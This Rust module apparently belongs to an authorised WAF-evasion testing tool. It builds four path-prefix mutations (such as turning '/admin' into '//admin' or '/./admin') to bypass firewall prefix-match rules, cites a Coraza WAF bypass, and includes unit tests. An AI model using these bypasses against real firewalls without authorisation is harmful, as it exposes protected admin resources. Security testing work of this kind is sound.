//! Path-prefix mutations — restructure the URI path so the WAF's
//! prefix-match ACL sees a different shape than the origin parser
//! eventually serves.
//!
//! ## Why this is a distinct module from [`crate::url_mutate`]
//!
//! `url_mutate` operates on path SEGMENT bytes and on QUERY VALUE
//! bytes. The mutations here operate on path STRUCTURE — they change
//! how the path is delimited, not what's inside it. Lumping them into
//! `UrlStrategy` would force a value-byte mutator and a path-shape
//! mutator into one enum and produce category errors at the call
//! sites that build attack pipelines.
//!
//! ## What's here
//!
//! ### `PathPrefixStrategy::DoubleSlash` — CVE-2025-29914 (Coraza WAF < 3.3.3)
//!
//! Coraza historically used Go's `net/url::Parse()` which treats URIs
//! starting with `//` as protocol-relative — `//admin` is parsed as
//! `Host = "admin"`, `Path = ""`. A Coraza ACL of the form
//! `SecRule REQUEST_URI "@beginsWith /admin"` does not fire because
//! `REQUEST_URI` was populated from the parsed `Path` field, which is
//! empty. The HTTP origin behind Coraza (nginx, Caddy, Envoy) re-parses
//! the raw request line, normalises `//admin` back to `/admin`, and
//! serves the protected resource. Confirmed CVSS 5.4; fixed in
//! Coraza 3.3.3. Every unpatched Coraza deployment with any
//! prefix-match ACL is bypassed by a one-character path edit.
//!
//! Citation:
//! <https://dev.to/cverports/cve-2025-29914-the-double-slash-deception-bypassing-coraza-waf-with-rfc-compliance-2l75>
//!
//! ### `PathPrefixStrategy::TripleSlash`
//!
//! Stretches `DoubleSlash` further — some normalisers collapse `///` →
//! `/` only after the first decode, so an origin that decodes once and
//! a WAF that decodes zero times see different forms. Useful when a
//! WAF normalises `//` but not `///`.
//!
//! ### `PathPrefixStrategy::SlashDot` / `SlashDotSlash`
//!
//! `/./admin` and `/.//admin`. RFC 3986 §5.2.4 says these resolve to
//! `/admin` after segment normalisation. WAFs that match the raw
//! REQUEST_URI literal miss them; origins that apply RFC normalisation
//! (Apache, IIS, most reverse proxies) serve the protected path.
//!
//! ## Reachability
//!
//! Exposed through `mutate_url_with_prefix()`. The strategy engine
//! drives this via a new `Technique::PathPrefix(...)` arm; the
//! parser-diff `path` family probes each variant in turn against the
//! authorised target.
//!
//! Pass 21 R62 — frontier technique #4 per the 2025 research scan.

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PathPrefixStrategy {
    /// `/admin` → `//admin`. CVE-2025-29914 (Coraza < 3.3.3).
    DoubleSlash,
    /// `/admin` → `///admin`. WAFs that fold `//` but not `///`.
    TripleSlash,
    /// `/admin` → `/./admin`. RFC 3986 §5.2.4 dot-segment that some
    /// raw-prefix WAFs ignore.
    SlashDot,
    /// `/admin` → `/.//admin`. Combines dot-segment with the
    /// protocol-relative trick — bypasses WAFs that strip only the
    /// `/.` form OR only the `//` form.
    SlashDotSlash,
}

impl PathPrefixStrategy {
    /// Stable technique label — what the gene-bank stores and what
    /// shows up in `--techniques` output. Pre-fix mutations that
    /// shipped without a label silently merged into the catch-all
    /// `url:path` bucket and the bandit couldn't tell them apart.
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            Self::DoubleSlash => "path:double_slash",
            Self::TripleSlash => "path:triple_slash",
            Self::SlashDot => "path:slash_dot",
            Self::SlashDotSlash => "path:slash_dot_slash",
        }
    }

    /// Apply the mutation to a path-and-query string. Returns the
    /// mutated string (caller does not re-encode); the path-and-query
    /// contract from [`crate::url_mutate::mutate_url`] is preserved.
    ///
    /// `path_and_query` must start with `/`. If it does not (the input
    /// is a relative or empty path), the function returns the input
    /// unchanged — silently doing nothing is the same contract
    /// `url_mutate::mutate_url` uses for non-conforming inputs.
    #[must_use]
    pub fn apply(self, path_and_query: &str) -> String {
        if !path_and_query.starts_with('/') {
            return path_and_query.to_string();
        }
        let prefix = match self {
            Self::DoubleSlash => "//",
            Self::TripleSlash => "///",
            Self::SlashDot => "/./",
            Self::SlashDotSlash => "/.//",
        };
        // Strip the existing leading slash before prepending — pre-fix
        // `/admin` → `///admin` for DoubleSlash because the leading `/`
        // was retained, accidentally producing the next mutation up.
        // Always normalise to: prefix + path-without-leading-slash.
        let rest = path_and_query.trim_start_matches('/');
        format!("{prefix}{rest}")
    }

    /// Every strategy in canonical order — drives the technique-rotation
    /// path in the strategy engine.
    pub const fn all() -> [Self; 4] {
        [
            Self::DoubleSlash,
            Self::TripleSlash,
            Self::SlashDot,
            Self::SlashDotSlash,
        ]
    }
}

/// Apply a path-prefix mutation to a path-and-query string. Returns
/// the mutated form and the technique label.
///
/// Wraps [`PathPrefixStrategy::apply`] with the label that the
/// gene-bank and `--techniques` flag downstream consume.
#[must_use]
pub fn mutate_path_prefix(
    path_and_query: &str,
    strategy: PathPrefixStrategy,
) -> (String, &'static str) {
    (strategy.apply(path_and_query), strategy.label())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn double_slash_maps_admin_to_double_admin() {
        // CVE-2025-29914 anti-rig: `/admin` MUST become `//admin`.
        // If this drifts (e.g. someone "tidies" the leading slash
        // semantics), every Coraza < 3.3.3 bypass we have stops working.
        assert_eq!(PathPrefixStrategy::DoubleSlash.apply("/admin"), "//admin");
    }

    #[test]
    fn triple_slash_normalises_to_triple() {
        assert_eq!(PathPrefixStrategy::TripleSlash.apply("/admin"), "///admin");
    }

    #[test]
    fn slash_dot_inserts_dot_segment() {
        assert_eq!(PathPrefixStrategy::SlashDot.apply("/admin"), "/./admin");
    }

    #[test]
    fn slash_dot_slash_combines_both_forms() {
        assert_eq!(
            PathPrefixStrategy::SlashDotSlash.apply("/admin"),
            "/.//admin"
        );
    }

    #[test]
    fn already_double_slash_input_does_not_compound() {
        // Anti-rig: applying DoubleSlash to a path that already has
        // multiple leading slashes MUST normalise back to exactly
        // two, not pile them up. Pre-fix the naive `format!("/{p}")`
        // approach turned `///x` into `////x`, defeating the purpose
        // (the WAF would already strip three-or-more, the FOUR-slash
        // case is yet another fold class).
        assert_eq!(PathPrefixStrategy::DoubleSlash.apply("///admin"), "//admin");
    }

    #[test]
    fn preserves_query_string() {
        // The query MUST survive the path-prefix mutation byte-for-byte.
        // If the query is rewritten, every other layer of the evasion
        // pipeline that depends on the query being well-formed breaks.
        assert_eq!(
            PathPrefixStrategy::DoubleSlash.apply("/admin?id=1&q=x"),
            "//admin?id=1&q=x"
        );
    }

    #[test]
    fn non_root_relative_input_passes_through() {
        // Path that doesn't start with `/` is a contract violation —
        // return unchanged rather than producing a malformed mutation.
        // Matches `mutate_url`'s "doesn't look like a path" guard.
        assert_eq!(PathPrefixStrategy::DoubleSlash.apply("admin"), "admin");
        assert_eq!(PathPrefixStrategy::DoubleSlash.apply(""), "");
    }

    #[test]
    fn root_only_path_is_handled() {
        // Boundary: `/` → `//`. Some target webserver default-routes
        // every request to `/`, and `//` is the trivial protocol-
        // relative form. Don't crash, don't produce empty.
        assert_eq!(PathPrefixStrategy::DoubleSlash.apply("/"), "//");
        assert_eq!(PathPrefixStrategy::SlashDot.apply("/"), "/./");
    }

    #[test]
    fn all_strategies_label_distinctly() {
        // Anti-rig: every strategy MUST produce a distinct technique
        // label, otherwise the bandit can't separate winners from
        // losers and the gene-bank merges adversarial classes.
        let labels: Vec<&str> = PathPrefixStrategy::all()
            .iter()
            .map(|s| s.label())
            .collect();
        let unique: std::collections::HashSet<_> = labels.iter().collect();
        assert_eq!(
            labels.len(),
            unique.len(),
            "every PathPrefixStrategy variant must have a distinct label"
        );
    }

    #[test]
    fn mutate_path_prefix_returns_label_matching_strategy() {
        // Anti-rig: the label returned by the public helper must
        // match the strategy's own label — pre-fix a refactor that
        // wired the wrong label through silently shipped.
        for s in PathPrefixStrategy::all() {
            let (_, label) = mutate_path_prefix("/admin", s);
            assert_eq!(label, s.label());
        }
    }
}
